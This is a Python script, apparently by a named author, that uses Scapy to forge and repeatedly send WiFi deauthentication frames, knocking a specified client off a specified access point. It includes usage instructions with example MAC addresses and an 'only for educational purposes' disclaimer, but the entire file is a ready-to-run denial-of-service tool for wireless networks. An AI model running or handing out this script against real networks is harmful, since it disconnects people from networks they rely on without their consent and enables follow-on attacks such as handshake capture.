'''
Code: DeAuthenticating a WiFi Access Point and a WiFi Client
Author: Qaidjohar Jawadwala
Usage: python wifi_dos.py channel ap_mac client_mac count interface
Example: python wifi_dos.py 7 E8:94:F6:D5:83:5E 98:0C:A5:5B:61:0B 10 wlan0mon

Note: Only for educational purposes.
'''

from scapy.all import *	#Importing Kali Linux
conf.verb = 0	#Dont display any non-sense Scapy
import sys	#Handle arguments and other system funcion
import os	#running system commands
import time	#Giving Delay


#Checking command line arguments
if(len(sys.argv) != 6):
	sys.exit("Invalid Arguments!!!\n Usage: python wifi_dos.py channel ap_mac client_mac count interface \n Example: python wifi_dos.py 7 E8:94:F6:D5:83:5E 98:0C:A5:5B:61:0B 10 wlan0mon")

#Assigning command line arguments to variables
channel = sys.argv[1]
ap_mac = sys.argv[2]
client_mac = sys.argv[3]
count = sys.argv[4]
interface = sys.argv[5]

#Configure Scapy to work on mentioned interface
conf.iface = interface

#Setting WiFi card to a channel
#iw dev wlan0mon set channel 7
channel_set = "iw dev "+interface+" set channel "+channel
os.system(channel_set)

#Creating a DeAuthentication Frame
deAuthFrame = RadioTap()/Dot11(addr1=client_mac,addr2=ap_mac,addr3=ap_mac)/Dot11Deauth()
#print(deAuthFrame.show())

#Looping till the count
for pkt in range(int(count)):
	#Sending DeAuthentication frame on Network
	sendp(deAuthFrame)
	print("["+str(pkt+1)+"] "+"Sending DeAuth- BSSID:"+ap_mac+"  Client:"+client_mac)
	#Providing delay of 0.5 seconds
	time.sleep(0.5)


